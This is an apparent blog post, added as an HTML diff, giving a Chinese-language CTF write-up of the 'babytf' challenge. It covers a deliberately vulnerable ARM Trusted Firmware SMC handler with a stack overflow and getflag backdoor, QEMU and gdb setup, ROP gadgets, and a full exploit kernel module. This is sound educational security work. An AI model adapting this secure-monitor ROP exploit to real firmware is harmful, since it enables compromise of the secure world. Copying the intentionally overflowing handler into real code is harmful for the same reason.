@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+    <title>jqctf 2024 babytf</title>
+    <link rel="icon" type="image/svg+xml" href="/favicon.svg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <nav class="site-nav">
+            <a href="./index.html" class="nav-link">/home</a>
+            <span class="nav-separator">|</span>
+            <a href="./about.html" class="nav-link">/about</a>
+        </nav>
+        <div class="terminal-prompt">
+            <span style="color:#666">[</span><span style="color:#fabd2f">ayoung</span><span style="color:#666">@</span><span style="color:#59adeb">lab</span> <span style="color:#83a598"><a href="./index.html" class="path-link">posts</a></span><span style="color:#666">]$</span> 
+            <span class="cmd">cat ./jqctf 2024 babytf.md</span><span class="cursor">█</span>
+        </div>
+        <h1 class="post-title">jqctf 2024 babytf</h1><div style="color: #666; font-size: 0.8rem; margin-bottom: 20px;">[Last modified: 2024-08-09]</div>
+    </header>
+    <div class="layout-grid">
+                <main><h2 id="fen-xi">分析</h2><p>题目给了</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">------         2024/7/29     18:52         130728 bl31.elf
+</span><span style="color:#c0c5ce;">------         2024/7/29     18:52        3308017 flash.bin
+</span><span style="color:#c0c5ce;">------         2024/7/29     18:53       41724416 Image
+</span><span style="color:#c0c5ce;">------         2024/7/29     19:59             19 kernel.release
+</span><span style="color:#c0c5ce;">------         2024/7/29     19:32         286926 linux.config
+</span><span style="color:#c0c5ce;">------         2024/7/29     19:41             22 linux_version.txt
+</span><span style="color:#c0c5ce;">------         2024/7/29     18:54       96618488 qemu-system-aarch64
+</span><span style="color:#c0c5ce;">------         2024/7/29     18:53       13745541 rootfs.cpio.gz
+</span><span style="color:#c0c5ce;">------         2024/7/29     18:52           1883 smc.c
+</span></pre>
+<p><code>smc.c</code>自己注册了一个存在栈溢出的smc_handler，且有后门<code>getflag</code>，需要传入flag地址作为参数，汇编是从系统寄存器读取flag</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">common/runtime_svc.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">assert.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">smccc_helpers.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">MY_SVC &quot;</span><span style="color:#a3be8c;">vuln_smc</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">vuln</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">x1</span><span style="color:#c0c5ce;">, size_t </span><span style="color:#bf616a;">x2</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buf[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ERROR</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">vuln</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buf,(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)x1, x2);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> flag[</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">];
+</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">getflag</span><span style="color:#c0c5ce;">(size_t </span><span style="color:#bf616a;">addr</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(addr != (size_t)flag){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">tf_log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\x0a</span><span style="color:#a3be8c;">get flag failed!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">asm</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">MRS             X1, S3_3_C15_C12_0</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">STR             W1, [X0]</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">MRS             X1, S3_3_C15_C12_1</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">STR             W1, [X0,#4]</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">MRS             X1, S3_3_C15_C12_2</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">STR             W1, [X0,#8]</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">MRS             X1, S3_3_C15_C12_3</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">STR             W1, [X0,#0xC]</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">MRS             X1, S3_3_C15_C12_4</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">STR             W1, [X0,#0x10]</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">MRS             X1, S3_3_C15_C12_5</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">STR             W1, [X0,#0x14]</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">MRS             X1, S3_3_C15_C12_6</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">STR             W1, [X0,#0x18]</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">MRS             X1, S3_3_C15_C12_7</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">        &quot;</span><span style="color:#a3be8c;">STR             W1, [X0,#0x1C]</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#c0c5ce;">    );
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(addr == (size_t)flag){
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">tf_log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\x0a</span><span style="color:#a3be8c;">get flag success!</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">tf_log</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\x0a</span><span style="color:#d08770;">%s</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;,flag);
+</span><span style="color:#c0c5ce;">    }
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">uintptr_t </span><span style="color:#8fa1b3;">my_smc_handler</span><span style="color:#c0c5ce;">(uint32_t </span><span style="color:#bf616a;">smc_fid</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">				   u_register_t </span><span style="color:#bf616a;">x1</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">				   u_register_t </span><span style="color:#bf616a;">x2</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">				   u_register_t </span><span style="color:#bf616a;">x3</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">				   u_register_t </span><span style="color:#bf616a;">x4</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">				   </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">cookie</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">				   </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">handle</span><span style="color:#c0c5ce;">,
+</span><span style="color:#c0c5ce;">				   u_register_t </span><span style="color:#bf616a;">flags</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ERROR</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">vuln_handler: SMC Call: 0x</span><span style="color:#d08770;">%x</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, smc_fid);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(smc_fid != </span><span style="color:#d08770;">0xc3000000</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">SMC_RET1</span><span style="color:#c0c5ce;">(handle, SMC_UNK);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">vuln</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)x1, (size_t)x2);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">SMC_RET1</span><span style="color:#c0c5ce;">(handle, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">int32_t </span><span style="color:#8fa1b3;">my_own_svc_setup</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">){
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">getflag</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0xdeadbeef</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ERROR</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">vuln_handler_setup</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ERROR</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Your share buffer is at 0x</span><span style="color:#d08770;">%x</span><span style="color:#a3be8c;">, size 0x2000</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x423DF000</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">DECLARE_RT_SVC</span><span style="color:#c0c5ce;">(
+</span><span style="color:#c0c5ce;">	MY_SVC,
+</span><span style="color:#c0c5ce;">	OEN_OEM_START,
+</span><span style="color:#c0c5ce;">	OEN_OEM_END,
+</span><span style="color:#c0c5ce;">	SMC_TYPE_FAST,
+</span><span style="color:#c0c5ce;">	my_own_svc_setup,
+</span><span style="color:#c0c5ce;">	my_smc_handler
+</span><span style="color:#c0c5ce;">);
+</span></pre>
+<p>没给qemu启动脚本，找之前的一个启动脚本喂给gpt，生成了一个可用的启动脚本：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">./qemu-system-aarch64 \
+</span><span style="color:#c0c5ce;">    -nographic \
+</span><span style="color:#c0c5ce;">    -smp 2 \
+</span><span style="color:#c0c5ce;">    -machine virt,secure=on,mte=off,gic-version=3,virtualization=false,acpi=off \
+</span><span style="color:#c0c5ce;">    -cpu max,pauth-impdef=on \
+</span><span style="color:#c0c5ce;">    -d unimp \
+</span><span style="color:#c0c5ce;">    -m 1057 \
+</span><span style="color:#c0c5ce;">    -monitor /dev/null \
+</span><span style="color:#c0c5ce;">    -bios flash.bin \
+</span><span style="color:#c0c5ce;">    -initrd rootfs.cpio.gz \
+</span><span style="color:#c0c5ce;">    -kernel Image \
+</span><span style="color:#c0c5ce;">    -append &#39;console=ttyAMA0,38400 keep_bootcon root=/dev/vda2&#39; \
+</span><span style="color:#c0c5ce;">    -object rng-random,filename=/dev/urandom,id=rng0 \
+</span><span style="color:#c0c5ce;">    -device virtio-rng-pci,rng=rng0,max-bytes=1024,period=1000 \
+</span><span style="color:#c0c5ce;">    -netdev user,id=vmnic \
+</span><span style="color:#c0c5ce;">    -device virtio-net-device,netdev=vmnic \
+</span><span style="color:#c0c5ce;">    -s
+</span></pre>
+<p>进去以后提供了root权限，因此可以编写驱动，触发smc处理函数。这里题目提供了地址<code>0x423DF000</code>直接使用，但是物理地址，要转成虚拟地址使用</p>
+<h2 id="diao-shi">调试</h2><p>传统方法，qemu开s，gdb-multiarch连上，有符号可以直接下断点</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">target remote :1234
+</span><span style="color:#c0c5ce;">file bl31.elf
+</span><span style="color:#c0c5ce;">b vuln
+</span></pre>
+<h2 id="qu-dong-bian-xie">驱动编写</h2><p>需要和题目给的内核版本对应，题目给了：</p>
+<ul>
+<li>linux_version.txt：<code>git checkout a24278ea7</code></li>
+<li>kernel.release：<code>6.6.0-ga24278ea74b2</code></li>
+<li>config文件</li>
+</ul>
+<p>进入<code>~/optee_qemu/linux</code>目录，切换分支
+kernel.release文件位置<code>include/config/kernel.release</code></p>
+<p>把config移动到linux目录下<code>.config</code>
+依次执行，第二行生成<code>Module.symvers</code>文件。该文件包含符号信息，编译自己的模块必备</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- oldconfig -j`nproc`
+</span><span style="color:#c0c5ce;">make ARCH=arm64 CROSS_COMPILE=aarch64-linux-gnu- modules_prepare -j`nproc`
+</span></pre>
+<p>另起一个目录 编写Makefile：</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">CROSS_COMPILE = aarch64-linux-gnu-
+</span><span style="color:#c0c5ce;">KERNEL_SRC = /home/ayoung/optee-qemu/linux
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">obj-m += my_module.o
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">all:
+</span><span style="color:#c0c5ce;">	make ARCH=arm64 CROSS_COMPILE=$(CROSS_COMPILE) -C $(KERNEL_SRC) M=$(PWD) modules
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">clean:
+</span><span style="color:#c0c5ce;">	make ARCH=arm64 CROSS_COMPILE=$(CROSS_COMPILE) -C $(KERNEL_SRC) M=$(PWD) clean
+</span></pre>
+<h2 id="rop">rop</h2><p>最后调一个arm64的rop返回后门</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">0x000000000e0a3418: ldp x19, x20, [sp, #0x10]; 
+</span><span style="color:#c0c5ce;">0x000000000e0a3414: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x30; ret; 
+</span></pre>
+<p>连续控制返回地址需要</p>
+<pre style="background-color:#2b303b;">
+<span style="color:#c0c5ce;">ldp x29, x30, [sp], #xxx; ret; 
+</span></pre>
+<h2 id="exp">exp</h2><pre style="background-color:#2b303b;">
+<span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/module.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/kernel.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/init.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/string.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#b48ead;">#include </span><span style="color:#c0c5ce;">&lt;</span><span style="color:#a3be8c;">linux/arm-smccc.h</span><span style="color:#c0c5ce;">&gt;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">SMC_FID </span><span style="color:#d08770;">0xC3000000
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">SHARED_BUF </span><span style="color:#d08770;">0x423DF000
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">GETFLAG </span><span style="color:#d08770;">0xE0A25A8
+</span><span style="color:#b48ead;">#define </span><span style="color:#c0c5ce;">FALG_ADDR </span><span style="color:#d08770;">0xE0D735C
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static char</span><span style="color:#c0c5ce;"> user_data[</span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">];
+</span><span style="color:#65737e;">// 0x000000000e0a3418: ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x30; ret; 
+</span><span style="color:#65737e;">// 0x000000000e0a3414: mov x0, x19; ldp x19, x20, [sp, #0x10]; ldp x29, x30, [sp], #0x30; ret; 
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static int</span><span style="color:#c0c5ce;"> __init </span><span style="color:#8fa1b3;">my_module_init</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pr_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">my_module: initing</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> arm_smccc_res res;
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(user_data, &#39;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0xf0</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(user_data+</span><span style="color:#d08770;">0xf0</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">B</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(user_data+</span><span style="color:#d08770;">0xf8</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">C</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(user_data+</span><span style="color:#d08770;">0x100</span><span style="color:#c0c5ce;">, &#39;</span><span style="color:#a3be8c;">D</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(user_data+</span><span style="color:#d08770;">0x108</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#96b5b4;">\x18\x34\x0a\x0e\x00\x00\x00</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// gadget1
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(user_data+</span><span style="color:#d08770;">0x138</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#96b5b4;">\x14\x34\x0a\x0e\x00\x00\x00</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// gadget2
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(user_data+</span><span style="color:#d08770;">0x140</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#96b5b4;">\x5c\x73\x0d\x0e\x00\x00\x00</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// x19=flag_addr
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(user_data+</span><span style="color:#d08770;">0x168</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#96b5b4;">\xa8\x25\x0a\x0e\x00\x00\x00</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">); </span><span style="color:#65737e;">// getflag
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> data_size = </span><span style="color:#d08770;">0x310</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*va = </span><span style="color:#8fa1b3;">phys_to_virt</span><span style="color:#c0c5ce;">((phys_addr_t)SHARED_BUF);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pr_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">my_module: virtual addr: 0x</span><span style="color:#d08770;">%llx</span><span style="color:#c0c5ce;">&quot;, (</span><span style="color:#b48ead;">unsigned long long</span><span style="color:#c0c5ce;">)va);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">*)va, user_data, data_size);
+</span><span style="color:#c0c5ce;">	
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">arm_smccc_smc</span><span style="color:#c0c5ce;">(SMC_FID, (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)SHARED_BUF, data_size, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, &amp;res);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pr_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">my_module: SMC call result: </span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;">, </span><span style="color:#d08770;">%lx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, res.</span><span style="color:#bf616a;">a0</span><span style="color:#c0c5ce;">, res.</span><span style="color:#bf616a;">a1</span><span style="color:#c0c5ce;">);
+</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#b48ead;">static void</span><span style="color:#c0c5ce;"> __exit </span><span style="color:#8fa1b3;">my_module_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">)
+</span><span style="color:#c0c5ce;">{
+</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">pr_info</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">my_module: exiting</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#c0c5ce;">}
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">module_init</span><span style="color:#c0c5ce;">(my_module_init);
+</span><span style="color:#8fa1b3;">module_exit</span><span style="color:#c0c5ce;">(my_module_exit);
+</span><span style="color:#c0c5ce;">
+</span><span style="color:#8fa1b3;">MODULE_LICENSE</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">GPL</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#8fa1b3;">MODULE_AUTHOR</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Your Name</span><span style="color:#c0c5ce;">&quot;);
+</span><span style="color:#8fa1b3;">MODULE_DESCRIPTION</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">My custom kernel module with SMC call</span><span style="color:#c0c5ce;">&quot;);
+</span></pre>
+<p>效果
+<img src="./images/Pasted%20image%2020240805161402.png" alt="" /></p>
+</main>
+                <aside class="toc-sidebar">
+                    <div class="toc-sticky-container">
+                        <div class="toc-header">:: Contents ::</div>
+                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#fen-xi">分析</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#diao-shi">调试</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#qu-dong-bian-xie">驱动编写</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#rop">rop</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#exp">exp</a></li></ul>
+                    </div>
+                </aside>
+            </div> 
+    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
+        Built with Rust. <span style="color: #66ed59;">EOF</span>
+    </footer>
+    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
+    <script src="script.js"></script>
+</body>
+</html>
